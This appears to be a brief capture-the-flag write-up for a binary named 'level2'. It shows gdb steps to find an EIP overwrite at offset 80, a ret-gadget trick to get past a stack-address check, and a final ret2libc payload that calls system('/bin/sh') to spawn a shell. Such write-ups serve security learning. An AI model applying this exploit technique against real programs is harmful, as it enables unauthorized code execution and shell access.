It wait for an input, print it and call strdup right after.


First we try to see if we control eip
gdb ./level2

run < <(python -c 'print "A" * 80')

0x41414141 in ?? => we control EIP, offset is 80 because our buffer is 76 + EBP
+ EIP

We cannot use stack address for EIP since they start with 0xbf and it is check in
the program.
0x08048500 <+44>:	cmp    $0xb0000000,%eax


We can use a little trick.

Make ret jump to himself so it doesn't trigger the cmp, and it will pop himself
ou the of the stack and execute the next instruction, which could be from the
stack now.

0x0804853e = himself (ret)
0xb7e6b060 = system (p system)
AAAA = ret addr for system ( could be whatever )

We also need to find an string "/bin/sh" to put on the top of the stack for
system.

(gdb) info proc mapping
(gdb) find 0xb7e2c000, +999999, "/bin/sh"


Final payload : 
cat <(python -c 'print "A" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "AAAA" + "\x58\xcc\xf8\xb7"') - | ./level2
